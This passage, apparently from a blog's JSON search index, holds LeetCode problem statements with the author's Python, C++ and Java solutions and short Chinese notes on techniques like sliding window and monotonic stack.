1.\nExample 1:\nInput: root = [3,9,20,null,null,15,7]Output: trueExample 2:\nInput: root = [1,2,2,3,3,null,null,4,4]Output: falseExample 3:\nInput: root = []Output: true Constraints:\nThe number of nodes in the tree is in the range [0, 5000].-104 \u003c= Node.val \u003c= 104 Sol def dfs(r): # [t/f, height] if not r: #or (not r.left and not r.right): return [True, 0] else: a = dfs(r.left) b = dfs(r.right) return [a[0] and b[0] and (abs(a[1]-b[1]) \u0026lt;= 1), max(a[1],b[1])+1] class Solution: def isBalanced(self, root: TreeNode) -\u0026gt; bool: return dfs(root)[0] ","permalink":"https://littlebees.github.io/2021/07/leetcode-110-balanced-binary-tree/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e多回傳值的dfs\u003c/p\u003e","title":"leetcode-110 - Balanced Binary Tree"},{"content":"動機 大概抓到sliding window的模式了\nProblem You are given an integer array nums consisting of n elements, and an integer k.\nFind a contiguous subarray whose length is equal to k that has the maximum average value and return this value. Any answer with a calculation error less than 10-5 will be accepted.\nExample 1:\nInput: nums = [1,12,-5,-6,50,3], k = 4Output: 12.75000Explanation: Maximum average is (12 - 5 - 6 + 50) / 4 = 51 / 4 = 12.75Example 2:\nInput: nums = [5], k = 1Output: 5.00000 Constraints:\nn == nums.length1 \u003c= k \u003c= n \u003c= 105-104 \u003c= nums[i] \u003c= 104 Sol a = 0 win_cnt = sum(s[a:b-1]) for b in range(b-1,len(s)): win_cnt += s[b] f() win_cnt -= s[a] a += 1 class Solution: def findMaxAverage(self, nums: List[int], k: int) -\u0026gt; float: a, cnt = 0,0 ret = sum(nums[:k])/k cnt = sum(nums[:k-1])*1.0 for b in range(k-1,len(nums)): cnt += nums[b] ret = max(ret, cnt/k) cnt -= nums[a] a+=1 return ret ","permalink":"https://littlebees.github.io/2021/07/leetcode-643-maximum-average-subarray-i/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e大概抓到sliding window的模式了\u003c/p\u003e","title":"leetcode-643 - Maximum Average Subarray I"},{"content":"動機 複習sliding window\nProblem The DNA sequence is composed of a series of nucleotides abbreviated as 'A', 'C', 'G', and 'T'.\nFor example, ACGAATTCCG is a DNA sequence.When studying DNA, it is useful to identify repeated sequences within the DNA.\nGiven a string s that represents a DNA sequence, return all the 10-letter-long sequences (substrings) that occur more than once in a DNA molecule. You may return the answer in any order.\nExample 1:\nInput: s = AAAAACCCCCAAAAACCCCCCAAAAAGGGTTTOutput: [AAAAACCCCC,CCCCCAAAAA]Example 2:\nInput: s = AAAAAAAAAAAAAOutput: [AAAAAAAAAA] Constraints:\n1 \u003c= s.length \u003c= 105s[i] is either 'A', 'C', 'G', or 'T'. Sol 對string計數\nclass Solution: def findRepeatedDnaSequences(self, s: str) -\u0026gt; List[str]: f = defaultdict(int) # str -\u0026gt; int if len(s) \u0026lt; 10: return [] else: a = 0 for b in range(10,len(s)+1): f[s[a:b]] += 1 a += 1 return [k for (k,v) in f.items() if v \u0026gt; 1] ","permalink":"https://littlebees.github.io/2021/07/leetcode-187-repeated-dna-sequences/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e複習sliding window\u003c/p\u003e","title":"leetcode-187 - Repeated DNA Sequences"},{"content":"動機 雖然說是複習sliding window，但學到一個很迷的技巧\nProblem Given two strings s1 and s2, return true if s2 contains a permutation of s1, or false otherwise.\nIn other words, return true if one of s1's permutations is the substring of s2.\nExample 1:\nInput: s1 = ab, s2 = eidbaoooOutput: trueExplanation: s2 contains one permutation of s1 (ba).Example 2:\nInput: s1 = ab, s2 = eidboaooOutput: false Constraints:\n1 \u003c= s1.length, s2.length \u003c= 104s1 and s2 consist of lowercase English letters. Sol 比對counter就好，但是substract會讓0留下來，會讓下次比對沒用\n所以要用now += Counter()\nclass Solution: def checkInclusion(self, s1: str, s2: str) -\u0026gt; bool: target,a,b = Counter(s1),0,len(s1) now = Counter(s2[a:b-1]) for b in range(len(s1),len(s2)+1): now.update(s2[b-1]) #print(now,a,b) if now == target: return True else: now.subtract(s2[a]) now += Counter() # remove all items whose val is 0 a += 1 return False ","permalink":"https://littlebees.github.io/2021/07/leetcode-567-permutation-in-string/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e雖然說是複習sliding window，但學到一個很迷的技巧\u003c/p\u003e","title":"leetcode-567 - Permutation in String"},{"content":"動機 這題會不會太過分\nProblem Given a positive integer n, return the number of the integers in the range [0, n] whose binary representations do not contain consecutive ones.\nExample 1:\nInput: n = 5Output: 5Explanation:Here are the non-negative integers \u003c= 5 with their corresponding binary representations:0 : 01 : 12 : 103 : 114 : 1005 : 101Among them, only integer 3 disobeys the rule (two consecutive ones) and the other 5 satisfy the rule. Example 2:\nInput: n = 1Output: 2Example 3:\nInput: n = 2Output: 3 Constraints:\n1 \u003c= n \u003c= 109 Sol 原本是給一個dp，用奇偶去刷出後面違法的數字，但要alloc很大的mem，大概到10^8就很慢，10^9直接死亡\nclass Solution { public: int findIntegers(int n) { int ret = 1; bool* dp = new bool[n+1]; memset(dp,0,sizeof(bool)*(n+1)); for(auto i=1;i\u0026lt;=n;i++) { if(dp[i]) { for (auto now = (i \u0026lt;\u0026lt; 1);now \u0026lt;= n;now \u0026lt;\u0026lt;= 1) dp[now] = dp[now+1 \u0026lt; n+1 ? now+1 : now] = 1; } else { if (i%2 == 1){ for (auto now = (i \u0026lt;\u0026lt; 1)|1;now \u0026lt;= n;now = ((now\u0026lt;\u0026lt;1)|1)) dp[now] = 1; } ret++; } } return ret; } }; 假設f(n)是n位數的所有沒有連續1的總數\n如果n是5，11111 ~ 00000 就會是\n10 111 ~ 10 000 f(3) 0 1111 ~ 0 0000 f(4) 這兩種組合，11 111 ~ 11 000就會出事就不用考慮，01 111 ~ 01 000會被0 1111 ~ 0 0000包含\n而這就是fib的遞迴模式\n所以要做的是，從最高位往下加所有組合，同時看有沒有11出現，有就後面不用算了 順利走完代表數字本身是ok的，故回傳之前要加1\nclass Solution: def findIntegers(self, n: int) -\u0026gt; int: @cache def fib(n): if n == 0: return 1 elif n == 1: return 2 else: return fib(n-1)+fib(n-2) ret, pre0 = 0, False for k in reversed(range(32)): if (n \u0026amp; (1 \u0026lt;\u0026lt; k)): # k+1 == 目前最高位長度 ret += fib(k) if pre0: return ret else: pre0 = True else: pre0 = False return ret+1 # 能跑出loop就是沒有Consecutive Ones ","permalink":"https://littlebees.github.io/2021/07/leetcode-600-non-negative-integers-without-consecutive-ones/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e這題會不會太過分\u003c/p\u003e","title":"leetcode-600 - Non-negative Integers without Consecutive Ones"},{"content":"動機 leetcode如今已經累積接近2000題，要刷就從別人整理好的list開始\n刷完的List 建議是從第一個刷到最後一個\n60 questions to solve Blind Curated 75 Top 100 Liked Questions Top Interview Questions Cracking The Coding Interview 6th Edition In LeetCode 有list Algorithm, Leetcode PATTERNS(seanprashad) 其他大大分享的List Algorithm, Leetcode Index for YT PTT Soft_Job 我的leetcode刷題清單 Algorithm, Leetcode_MostLikedQuests ","permalink":"https://littlebees.github.io/2021/07/leetcode%E7%9A%84%E5%95%8F%E9%A1%8C%E9%9B%86/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003eleetcode如今已經累積接近2000題，要刷就從別人整理好的list開始\u003c/p\u003e","title":"leetcode的問題集"},{"content":"動機 backtrack與重複\nfilter與next是不是有bug阿\nProblem Given an integer array nums that may contain duplicates, return all possible subsets (the power set).\nThe solution set must not contain duplicate subsets. Return the solution in any order.\nExample 1:\nInput: nums = [1,2,2]Output: [[],[1],[1,2],[1,2,2],[2],[2,2]]Example 2:\nInput: nums = [0]Output: [[],[0]] Constraints:\n1 \u003c= nums.length \u003c= 10-10 \u003c= nums[i] \u003c= 10 Sol 把重複的視為一體沒有重複的問題了\nclass Solution: def subsetsWithDup(self, nums: List[int]) -\u0026gt; List[List[int]]: def dfs(nums): if not nums: return [[]] elif len(nums) == 1 or nums[0] != nums[1]: ret = dfs(nums[1:]) return ret+[s+[nums[0]] for s in ret] else: i = 1 while i \u0026lt; len(nums) and nums[i-1] == nums[i]: i += 1 # i = next(filter(lambda ix: nums[ix[0]-1] != nums[ix[0]], enumerate(nums)),[len(nums),None])[0] # [1,1,2,2] 時 i 會是0 !?? ret = dfs(nums[i:]) ss = [[nums[0]]*n for n in range(1,i+1)] return ret + sum([[s+x for x in ret] for s in ss],[]) return dfs(sorted(nums)) ","permalink":"https://littlebees.github.io/2021/07/leetcode-90-subsets-ii/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003ebacktrack與重複\u003c/p\u003e\n\u003cp\u003efilter與next是不是有bug阿\u003c/p\u003e","title":"leetcode-90 - Subsets II"},{"content":"動機 接ptr\nProblem Given a linked list, swap every two adjacent nodes and return its head. You must solve the problem without modifying the values in the list's nodes (i.e., only nodes themselves may be changed.)\nExample 1:\nInput: head = [1,2,3,4]Output: [2,1,4,3]Example 2:\nInput: head = []Output: []Example 3:\nInput: head = [1]Output: [1] Constraints:\nThe number of nodes in the list is in the range [0, 100].0 \u003c= Node.val \u003c= 100 Sol class Solution: def swapPairs(self, head: ListNode) -\u0026gt; ListNode: if not head or not head.next: return head else: a,prev = head, None ret = head.next while a and a.next: b,nexta = a.next, a.next.next b.next = a b.next.next = nexta if prev: prev.next = b a,prev = nexta, a if a: a.next = None return ret ","permalink":"https://littlebees.github.io/2021/07/leetcode-24-swap-nodes-in-pairs/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e接ptr\u003c/p\u003e","title":"leetcode-24 - Swap Nodes in Pairs"},{"content":"動機 水題\nProblem Given an integer numRows, return the first numRows of Pascal's triangle.\nIn Pascal's triangle, each number is the sum of the two numbers directly above it as shown:\nExample 1:\nInput: numRows = 5Output: [[1],[1,1],[1,2,1],[1,3,3,1],[1,4,6,4,1]]Example 2:\nInput: numRows = 1Output: [[1]] Constraints:\n1 \u003c= numRows \u003c= 30 Sol class Solution: def generate(self, n: int) -\u0026gt; List[List[int]]: if n == 1: return [[1]] else: ret = self.generate(n-1) ret += [[ret[-1][0]] + [ret[-1][i] + ret[-1][i+1] for i in range(len(ret[-1])-1)] + [ret[-1][-1]]] return ret ","permalink":"https://littlebees.github.io/2021/07/leetcode-118-pascals-triangle/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e水題\u003c/p\u003e","title":"leetcode-118 - Pascal's Triangle"},{"content":"動機 阿，除法\nProblem Given two integers dividend and divisor, divide two integers without using multiplication, division, and mod operator.\nReturn the quotient after dividing dividend by divisor.\nThe integer division should truncate toward zero, which means losing its fractional part. For example, truncate(8.345) = 8 and truncate(-2.7335) = -2.\nNote: Assume we are dealing with an environment that could only store integers within the 32-bit signed integer range: [−231, 231 − 1]. For this problem, assume that your function returns 231 − 1 when the division result overflows.\nExample 1:\nInput: dividend = 10, divisor = 3Output: 3Explanation: 10/3 = truncate(3.33333..) = 3.Example 2:\nInput: dividend = 7, divisor = -3Output: -2Explanation: 7/-3 = truncate(-2.33333..) = -2.Example 3:\nInput: dividend = 0, divisor = 1Output: 0Example 4:\nInput: dividend = 1, divisor = 1Output: 1 Constraints:\n-231 \u003c= dividend, divisor \u003c= 231 - 1divisor != 0 Sol 一直把除數乘2，直到比被除數小一點，扣掉，loop\nclass Solution: def divide(self, p: int, q: int) -\u0026gt; int: int_max = (1 \u0026lt;\u0026lt; 31) minus, ret = (p \u0026lt; 0) ^ (q \u0026lt; 0), 0 p,q = abs(p), abs(q) while p \u0026gt;= q: tmp,part = q,1 while p \u0026gt;= (tmp \u0026lt;\u0026lt; 1): # 從最右邊開始扣 tmp, part = (tmp \u0026lt;\u0026lt; 1), (part \u0026lt;\u0026lt; 1) ret, p = ret+part, p-tmp if minus: ret = max(-ret, -int_max) else: ret = min(ret, int_max-1) return ret ","permalink":"https://littlebees.github.io/2021/07/leetcode-29-divide-two-integers/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e阿，除法\u003c/p\u003e","title":"leetcode-29 - Divide Two Integers"},{"content":"動機 讓每個遞迴只負責一個工作\nProblem You are given a nested list of integers nestedList. Each element is either an integer or a list whose elements may also be integers or other lists. Implement an iterator to flatten it.\nImplement the NestedIterator class:\nNestedIterator(List nestedList) Initializes the iterator with the nested list nestedList.int next() Returns the next integer in the nested list.boolean hasNext() Returns true if there are still some integers in the nested list and false otherwise.Your code will be tested with the following pseudocode:\ninitialize iterator with nestedListres = []while iterator.hasNext() append iterator.next() to the end of resreturn resIf res matches the expected flattened list, then your code will be judged as correct.\nExample 1:\nInput: nestedList = [[1,1],2,[1,1]]Output: [1,1,2,1,1]Explanation: By calling next repeatedly until hasNext returns false, the order of elements returned by next should be: [1,1,2,1,1].Example 2:\nInput: nestedList = [1,[4,[6]]]Output: [1,4,6]Explanation: By calling next repeatedly until hasNext returns false, the order of elements returned by next should be: [1,4,6]. Constraints:\n1 \u003c= nestedList.length \u003c= 500The values of the integers in the nested list is in the range [-106, 106]. Sol 多一個top，來取目前的值，同時利用裡面的遞迴，去清stack\nclass NestedIterator: def __init__(self, nestedList: [NestedInteger]): self.stk = [[nestedList,0]] # (list, index) def top(self): if self.stk: l, i = self.stk[-1] if i \u0026lt; len(l): if l[i].isInteger(): ret = l[i].getInteger() return ret else: self.stk[-1][1] += 1 self.stk.append([l[i].getList(),0]) return self.top() else: self.stk.pop() return self.top() else: return False def next(self) -\u0026gt; int: ret = self.top() self.stk[-1][1] += 1 return ret def hasNext(self) -\u0026gt; bool: return self.top() is not False ","permalink":"https://littlebees.github.io/2021/07/leetcode-341-flatten-nested-list-iterator/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e讓每個遞迴只負責一個工作\u003c/p\u003e","title":"leetcode-341 - Flatten Nested List Iterator"},{"content":"動機 就是backtrack\nProblem Given a string s and a dictionary of strings wordDict, add spaces in s to construct a sentence where each word is a valid dictionary word. Return all such possible sentences in any order.\nNote that the same word in the dictionary may be reused multiple times in the segmentation.\nExample 1:\nInput: s = catsanddog, wordDict = [cat,cats,and,sand,dog]Output: [cats and dog,cat sand dog]Example 2:\nInput: s = pineapplepenapple, wordDict = [apple,pen,applepen,pine,pineapple]Output: [pine apple pen apple,pineapple pen apple,pine applepen apple]Explanation: Note that you are allowed to reuse a dictionary word.Example 3:\nInput: s = catsandog, wordDict = [cats,dog,sand,and,cat]Output: [] Constraints:\n1 \u003c= s.length \u003c= 201 \u003c= wordDict.length \u003c= 10001 \u003c= wordDict[i].length \u003c= 10s and wordDict[i] consist of only lowercase English letters.All the strings of wordDict are unique. Sol class Solution: def wordBreak(self, s: str, wordDict: List[str]) -\u0026gt; List[str]: def bt(s,acc): if not s: return [acc[1:]] # remove leading space else: ret = [] for i in range(1,len(s)+1): if s[:i] in wordDict: ret += bt(s[i:], f\u0026#34;{acc} {s[:i]}\u0026#34;) return ret return bt(s, \u0026#34;\u0026#34;) ","permalink":"https://littlebees.github.io/2021/07/leetcode-140-word-break-ii/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e就是backtrack\u003c/p\u003e","title":"leetcode-140 - Word Break II"},{"content":"動機 因為題目特性，不用考慮重複走的問題\nProblem Given an m x n integers matrix, return the length of the longest increasing path in matrix.\nFrom each cell, you can either move in four directions: left, right, up, or down. You may not move diagonally or move outside the boundary (i.e., wrap-around is not allowed).\nExample 1:\nInput: matrix = [[9,9,4],[6,6,8],[2,1,1]]Output: 4Explanation: The longest increasing path is [1, 2, 6, 9].Example 2:\nInput: matrix = [[3,4,5],[3,2,6],[2,2,1]]Output: 4Explanation: The longest increasing path is [3, 4, 5, 6]. Moving diagonally is not allowed.Example 3:\nInput: matrix = [[1]]Output: 1 Constraints:\nm == matrix.lengthn == matrix[i].length1 \u003c= m, n \u003c= 2000 \u003c= matrix[i][j] \u003c= 231 - 1 Sol 這裡不用考慮重複走，因為數字是遞增的!! 看417\nclass Solution: def longestIncreasingPath(self, ms: List[List[int]]) -\u0026gt; int: @cache def dp(i,j): if i \u0026lt; 0 or i \u0026gt;= len(ms) or j \u0026lt; 0 or j \u0026gt;= len(ms[i]): return 0 else: dirs = [(i+1,j),(i-1,j),(i,j+1),(i,j-1)] dirs = [(x,y) for (x,y) in dirs if 0 \u0026lt;= x \u0026lt; len(ms) and 0 \u0026lt;= y \u0026lt; len(ms[x]) and ms[i][j] \u0026lt; ms[x][y]] # 這裡不用考慮重複走，因為數字是遞增的!! 看417 dirs = [dp(x,y) for (x,y) in dirs] if dirs: ret = 1+max(dirs) else: ret = 1 return ret return max([max([dp(i,j) for j in range(len(ms[i]))]) for i in range(len(ms))]) ","permalink":"https://littlebees.github.io/2021/07/leetcode-329-longest-increasing-path-in-a-matrix/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e因為題目特性，不用考慮重複走的問題\u003c/p\u003e","title":"leetcode-329 - Longest Increasing Path in a Matrix"},{"content":"動機 沒辦法用cache_computing偷懶了\nProblem There are a total of numCourses courses you have to take, labeled from 0 to numCourses - 1. You are given an array prerequisites where prerequisites[i] = [ai, bi] indicates that you must take course bi first if you want to take course ai.\nFor example, the pair [0, 1], indicates that to take course 0 you have to first take course 1.Return the ordering of courses you should take to finish all courses. If there are many valid answers, return any of them. If it is impossible to finish all courses, return an empty array.\nExample 1:\nInput: numCourses = 2, prerequisites = [[1,0]]Output: [0,1]Explanation: There are a total of 2 courses to take. To take course 1 you should have finished course 0. So the correct course order is [0,1].Example 2:\nInput: numCourses = 4, prerequisites = [[1,0],[2,0],[3,1],[3,2]]Output: [0,2,1,3]Explanation: There are a total of 4 courses to take. To take course 3 you should have finished both courses 1 and 2. Both courses 1 and 2 should be taken after you finished course 0.So one correct course order is [0,1,2,3]. Another correct ordering is [0,2,1,3].Example 3:\nInput: numCourses = 1, prerequisites = []Output: [0] Constraints:\n1 \u003c= numCourses \u003c= 20000 \u003c= prerequisites.length \u003c= numCourses * (numCourses - 1)prerequisites[i].length == 20 \u003c= ai, bi \u003c numCoursesai != biAll the pairs [ai, bi] are distinct. Sol 因為求時path可以利用共用的狀態，從原本的找修此課之前要修什麼，變成還要修什麼\ntopo sort還有Kahn\u0026rsquo;s algorithm\nclass Solution: def findOrder(self, numCourses: int, pres: List[List[int]]) -\u0026gt; List[int]: premises = defaultdict(list) # class, [premises] [premises[c].append(p) for (c,p) in pres] nofrees = set(premises.keys()) frees = set(range(numCourses)) - nofrees seen = {} # True :: done def dfs(c): if c in seen: if seen[c]: return [] else: raise \u0026#39;loop!!\u0026#39; else: seen[c] = False if c in frees: ret = [] else: ret = list(reduce(lambda ret,p: ret+dfs(p), premises[c], []))+[c] seen[c] = True return ret try: if nofrees: return list(frees)+list(reduce(lambda acc,c: acc+dfs(c), nofrees, [])) else: return list(frees) except: return [] ","permalink":"https://littlebees.github.io/2021/07/leetcode-210-course-schedule-ii/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e沒辦法用cache_computing偷懶了\u003c/p\u003e","title":"leetcode-210 - Course Schedule II"},{"content":"動機 以後遇到回文優先考慮中心展開\nProblem Given a string containing just the characters '(' and ')', find the length of the longest valid (well-formed) parentheses substring.\nExample 1:\nInput: s = (()Output: 2Explanation: The longest valid parentheses substring is ().Example 2:\nInput: s = )()())Output: 4Explanation: The longest valid parentheses substring is ()().Example 3:\nInput: s = Output: 0 Constraints:\n0 \u003c= s.length \u003c= 3 * 104s[i] is '(', or ')'. Ver1: TLE int dp[2000][2000] = {0}; class Solution { public: int getEval(int i,int j) { return !dp[i][j] ? -1 : dp[i][j]; } bool notEval(int i,int j) { return dp[i][j] == 0;} int f(string \u0026amp;s,int i,int j) { if(i \u0026gt; s.size() || j \u0026lt; 0) return -1; else if(i \u0026gt;= j) dp[i][j] = -1; if(notEval(i,j)) { if(s[i] == \u0026#39;(\u0026#39; \u0026amp;\u0026amp; s[j] == \u0026#39;)\u0026#39;) { // !! for(int k=i+1;k+1\u0026lt;j;k++) if(s[k] == \u0026#39;)\u0026#39; \u0026amp;\u0026amp; s[k+1] == \u0026#39;(\u0026#39;) // !! if(f(s,i,k) \u0026gt; 0 \u0026amp;\u0026amp; f(s,k+1,j) \u0026gt; 0) dp[i][j] = max(getEval(i,j),f(s,i,k)+f(s,k+1,j)); dp[i][j] = max(getEval(i,j), f(s,i+1,j-1) \u0026gt; 0 ? f(s,i+1,j-1)+2 : -1); } else dp[i][j] = -1; } return getEval(i,j); } void initDP(string \u0026amp;s) { memset(dp, 0, sizeof(dp)); for(int i=0;i\u0026lt;s.size();i++) dp[i][i] = -1; } void find_out_single_pair(string \u0026amp;s) { // 找() for(int i=0;i+1\u0026lt;s.size();i++) if(s[i] == \u0026#39;(\u0026#39; \u0026amp;\u0026amp; s[i+1]==\u0026#39;)\u0026#39;) dp[i][i+1] = 2; } int longestValidParentheses(string s) { initDP(s); find_out_single_pair(s); int ans = 0; for(int i=0;i\u0026lt;s.size();i++) for(int j=0;j\u0026lt;s.size();j++) ans = max(ans,f(s,i,j)); //ans = f(s,0,s.size()-1); //for(int i=0;i\u0026lt;s.size();i++) { // for(int j=0;j\u0026lt;s.size();j++) // cout \u0026lt;\u0026lt; dp[i][j] \u0026lt;\u0026lt; \u0026#39; \u0026#39;; // cout \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; //} return ans; } }; Ver2: TLE 等等，為什麼每次run test拋出來的時間都不一樣啊 一下76ms，一下超時\nint dp[2000][2000] = {0}; class Solution { public: int ans = 0; void initDP(string \u0026amp;s) { memset(dp, 0, sizeof(dp)); for(int i=0;i\u0026lt;s.size();i++) dp[i][i] = -1; ans = 0; } void setDP(int i,int j,int val) { dp[i][j] = val, ans = max(ans,val); } bool isPair(string \u0026amp;s,int i,int j) { return s[i] == \u0026#39;(\u0026#39; \u0026amp;\u0026amp; s[j] == \u0026#39;)\u0026#39;; } void compDiv(string \u0026amp;s,int i,int j) { for(int x=i+1;x+1\u0026lt;j;x++) // [i~k] + [k+1~j] if(isPair(s,x+1,x) \u0026amp;\u0026amp; dp[i][x] \u0026gt; 0 \u0026amp;\u0026amp; dp[x+1][j] \u0026gt; 0) setDP(i,j,dp[i][x] + dp[x+1][j]); } int longestValidParentheses(string s) { initDP(s); for(int i=0;i+1\u0026lt;s.size();i++) if(isPair(s,i,i+1)) { setDP(i,i+1,2); for(int k=1;i-k \u0026gt;= 0 \u0026amp;\u0026amp; (i+1)+k \u0026lt; s.size() \u0026amp;\u0026amp; isPair(s,i-k,(i+1)+k);k++) setDP(i-k,(i+1)+k,dp[i-(k-1)][(i+1)+(k-1)] + 2); } for(int k=1;k\u0026lt;s.size();k++) for(int j=k,i=0;j\u0026lt;s.size();j++,i++) if(isPair(s,i,j)) { compDiv(s,i,j); if(i+1 \u0026lt; s.size() \u0026amp;\u0026amp; j-1 \u0026gt;= 0 \u0026amp;\u0026amp;　dp[i+1][j-1] \u0026gt; 0) setDP(i,j,max(dp[i][j], dp[i+1][j-1] + 2)); } /* for(int i=0;i\u0026lt;s.size();i++) { for(int j=0;j\u0026lt;s.size();j++) cout \u0026lt;\u0026lt; dp[i][j] \u0026lt;\u0026lt; \u0026#39; \u0026#39;; cout \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } */ return ans; } }; Ver3: AC 定義: dp[i]是到i為止最長的括號長度\nint dp[100000] = {0}; int ans = 0,len=0; class Solution { public: void initDP(string \u0026amp;s) { memset(dp, 0, sizeof(dp)); ans = 0; len=s.size(); } bool isLegal(int i) { return i \u0026gt;= 0 \u0026amp;\u0026amp; i \u0026lt; len; } bool isPair(string \u0026amp;s,int i,int j) { return isLegal(i) \u0026amp;\u0026amp; isLegal(j) \u0026amp;\u0026amp; s[i] == \u0026#39;(\u0026#39; \u0026amp;\u0026amp; s[j] == \u0026#39;)\u0026#39;; } bool isCons(string \u0026amp;s,int i,int j) { return isLegal(i) \u0026amp;\u0026amp; isLegal(j) \u0026amp;\u0026amp; s[i] == \u0026#39;)\u0026#39; \u0026amp;\u0026amp; s[j] == \u0026#39;)\u0026#39;; } int getDP(int i) { return isLegal(i) ? dp[i] : 0; } void setDP(int i,int val) { dp[i] = val, ans = max(ans,val); } int longestValidParentheses(string s) { initDP(s); for(int i=1;i\u0026lt;s.size();i++) if(isPair(s,i-1,i)) setDP(i,getDP(i-2)+2); else if(isCons(s,i-1,i) \u0026amp;\u0026amp; getDP(i-1) \u0026gt; 0 \u0026amp;\u0026amp; isPair(s,i-getDP(i-1)-1,i)) setDP(i,getDP(i-1)+2+getDP(i-2-getDP(i-1))); return ans; } }; case study 從左邊往右看，左是開頭，只有對應的右就會被算進長度，但一旦右超過，左就再也不能被算，就要重新計數\n所以可以左右兩邊都算，找最大的\npublic class Solution { public int longestValidParentheses(String s) { int left = 0, right = 0, maxlength = 0; for (int i = 0; i \u0026lt; s.length(); i++) { if (s.charAt(i) == \u0026#39;(\u0026#39;) { left++; } else { right++; } if (left == right) { maxlength = Math.max(maxlength, 2 * right); } else if (right \u0026gt;= left) { left = right = 0; } } left = right = 0; for (int i = s.length() - 1; i \u0026gt;= 0; i--) { if (s.charAt(i) == \u0026#39;(\u0026#39;) { left++; } else { right++; } if (left == right) { maxlength = Math.max(maxlength, 2 * left); } else if (left \u0026gt;= right) { left = right = 0; } } return maxlength; } } ","permalink":"https://littlebees.github.io/2021/07/leetcode-32-longest-valid-parentheses/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e以後遇到回文優先考慮中心展開\u003c/p\u003e","title":"leetcode-32 - Longest Valid Parentheses"},{"content":"動機 Monotonic Stack在pop時當下的狀態是\n1 2 3 .left. 7 .right. 2 right的數字大小一定是大於7!! left的數字一定是等於7\n這樣就可以形成一個閉區間，這也讓這題變成經典題\nProblem Given an array of integers heights representing the histogram's bar height where the width of each bar is 1, return the area of the largest rectangle in the histogram.\nExample 1:\nInput: heights = [2,1,5,6,2,3]Output: 10Explanation: The above is a histogram where width of each bar is 1.The largest rectangle is shown in the red area, which has an area = 10 units.Example 2:\nInput: heights = [2,4]Output: 4 Constraints:\n1 \u003c= heights.length \u003c= 1050 \u003c= heights[i] \u003c= 104 Sol class Solution: def largestRectangleArea(self, hs: List[int]) -\u0026gt; int: ret = 0 stk = [] # [end of seg, len] for i,n in enumerate(hs+[0]): while stk and hs[stk[-1]] \u0026gt;= n: j = stk.pop() if stk: ret = max(ret, hs[j]*(i-stk[-1]-1)) else: ret = max(ret, hs[j]*(i)) stk += i, return ret ","permalink":"https://littlebees.github.io/2021/07/leetcode-84-largest-rectangle-in-histogram/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003eMonotonic Stack在pop時當下的狀態是\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e1 2 3 .left. 7 .right. 2\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eright的數字大小一定是大於7!!\nleft的數字一定是等於7\u003c/p\u003e\n\u003cp\u003e這樣就可以形成一個閉區間，這也讓這題變成經典題\u003c/p\u003e","title":"leetcode-84 - Largest Rectangle in Histogram"},{"content":"動機 不同的DP不同的難易度\nProblem Given a rows x cols binary matrix filled with 0's and 1's, find the largest rectangle containing only 1's and return its area.\nExample 1:\nInput: matrix = [[1,0,1,0,0],[1,0,1,1,1],[1,1,1,1,1],[1,0,0,1,0]]Output: 6Explanation: The maximal rectangle is shown in the above picture.Example 2:\nInput: matrix = []Output: 0Example 3:\nInput: matrix = [[0]]Output: 0Example 4:\nInput: matrix = [[1]]Output: 1Example 5:\nInput: matrix = [[0,0]]Output: 0 Constraints:\nrows == matrix.lengthcols == matrix[i].length0 \u003c= row, cols \u003c= 200matrix[i][j] is '0' or '1'. Ver1: WA def p(m): for i in range(0,len(m)): print(m[i]) class Solution: def maximalRectangle(self, m: List[List[str]]) -\u0026gt; int: if not m: return 0 m = [[int(x) for x in i] for i in m] for i in range(0,len(m)): for j in range(0,len(m[i])): if j-1 \u0026gt;= 0 and m[i][j] is 1: m[i][j] += m[i][j-1] p(m) print(\u0026#34;====\u0026#34;) m.insert(0,[0]*len(m[0])) p(m) print(\u0026#34;====\u0026#34;) ans = 0 for j in range(0,len(m[0])): k = 0 for i in range(1,len(m)): if m[i][j] \u0026gt; 0: # 有直的 k += 1 # 有橫的 if m[i-1][j] \u0026gt;= m[i][j]: # 有大塊的 print(\u0026#34;big\u0026#34;) print(i,j,m[i-1][j], m[i][j]) m[i-1][j] = k * min(m[i-1][j], m[i][j]) else: m[i-1][j] = max(k,m[i][j]) else: m[i-1][j] = 0 k = 0 ans = max(ans,m[i-1][j]) p(m) return ans Ver2: AC 分批算面積\nclass Solution: def maximalRectangle(self, m: List[List[str]]) -\u0026gt; int: if not m: return 0 m = [[int(x) for x in i] for i in m] for i in range(0,len(m)): for j in range(0,len(m[i])): if j-1 \u0026gt;= 0 and m[i][j] is 1: m[i][j] += m[i][j-1] #[print(x) for x in m] ans = 0 for i in range(0,len(m)): for j in range(0,len(m[i])): mr = 999999999 # smallest rectangle if m[i][j] != 0: for k in range(i,len(m)): #print((i,j),(k,j),m[k][j],mr) if m[k][j] != 0: mr = min(mr,m[k][j]) ans = max(ans,(k-i+1)*mr) else: break #print(ans,mr) return ans ","permalink":"https://littlebees.github.io/2021/07/leetcode-85-maximal-rectangle/","summary":"\u003ch2 